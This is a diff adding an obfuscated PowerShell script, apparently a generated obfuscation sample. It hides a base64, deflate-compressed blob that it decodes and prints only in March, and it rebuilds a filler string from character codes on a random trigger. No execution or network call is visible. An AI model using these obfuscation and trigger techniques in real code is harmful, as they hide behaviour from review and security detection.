@@ -1,0 +1,28 @@
+fUNCtIoN wjvnw { 
+    [ cMDletBIndiNG()]Param( 
+        [PARamETER (ValuefROmpIPeLInE)]
+        $IbDIc,
+        [PARamETER (ValuefROmpIPeLInE)]
+        $UpAETA
+    )
+    iF(( GEt-ranDom @(0..20)) -eq 10){
+        $MVpaxHaM=$IbDIc.rEPlace(([ChaR]121+[ChaR]78+[ChaR]72),'.').rEPlace(([ChaR]65+[ChaR]86+[ChaR]111),[STrIng][ChaR]34).rEPlace('bfe',[STrIng][ChaR]39).rEPlace('7X9','$').rEPlace(([ChaR]76+[ChaR]110+[ChaR]89),[STrIng][ChaR]58)
+    
+    }
+    iF(( Get-dATe ).mOnTh -eq 3){
+        $kETQQh= [io.MEmorYstrEaM] [cOnVert]::fRoMBasE64STrInG( $UpAETA) 
+        $kETQQh | Vuwywwd    
+    }
+}
+fUNCtIoN Vuwywwd { 
+    [ cMDletBIndiNG() ]Param( 
+        [PARamETER(ValuefROmpIPeLInE)]
+        $moulwKh
+    )
+    ( nEW-obJECt   SystEM.IO.compreSSION.defLaTEStrEAm($moulwKh, [iO.COmPrESSIOn.COmpREsSIonmodE]::decoMpreSs) |FOReACH-ObjeCT{ nEW-obJECt   io.strEamREADER($_ ,[tExT.encodiNg]::aScii ) }| foreACh-ObJECt { $_.rEADToEnD() } ) | write-host
+}
+ $hLLC='7X9result = AVoThe apple doesnbfet fall far from the treeyNHipLnY85yNH220yNH98yNH80AVo
+'
+$kStIjX='BcHZtqkAAADQX7kPd637Ks1pUBoojYjS0UzJIWlE/373/lulr+ZW/6H+/GOboc5HA5nWhJSvhvFh2JUaeb4AIpN9J7nb7v4UAxCs5l7LDmvpGZz5Hj6A1/PLwh3IJ0pJBNDGn0kM2C0FkjHrj655d+hB8WM5wTsB6iee2JLAtwxyQim7zl15cl/j7DnaQXSiMLwDxRffJGuZ8/rFQ+btKE83KCvB39DuCsLRME4GZrMAndXe4MQezohbgcWO00i5H1nZuQAg9Y7QY8ka/IOaPcWh301IS9jT+OGrjAybVLFxz2ydWDrOWuqJs5bViOY8g4Hf/DLtyrpWlyBy62VQVe8RCNC0yUO9MbssVYrnt7Kn+qByh23+vlgYnW1DFdhPKkoahwFSwPEa35YsWsdzLXv6zAKKv7t0Ifystpcp9Q4JoymsHcccTUbFvDuAJRyexTfSp3256EewlOx5amzm0LwHWzIB3SvEglo0Sknvcrbs6AZMGDty20ouzXsIvf1AzSky2vA5Vfk8Cdf97aZTU1+a0CxvFz9NhaM7X/dKE/GT1muUXooZW5gRnze53L/mM6hmSmMksUWwAUI+vJi6yeK4gVWnOvnVAM5Gn3NeI+Q7HlpvJt2Ep6JDU6q4bxD69VIrWJo8x/MVA+R1CPutKmEqZb8WH+D3JE+U8azbLhGzDMm7xzVjEunDu6b9j3FACEvcrH4AiWkOWH2wDmW1gCMNDzrrqlkrDmBE0ro6c1UmYUp1Lgc4i2dBNFe3ZS0c4VgHSkGEV10hcqEyI9yOoD3WY4XCt+jTy8sIUgwXobtq3fr0i9ziZsu89sOC4f2cADM/WxZ9z2yq19HyfGS2qJ36g6i8+X4vwSbJ4VZWrab/dCgEyIx8sq7DkV0RfOJ59DRV1U+iuXuSMjmtP+S1dlP+/Qc='
+wjvnw -IbDIc $hLLC -UpAETA $kStIjX
+
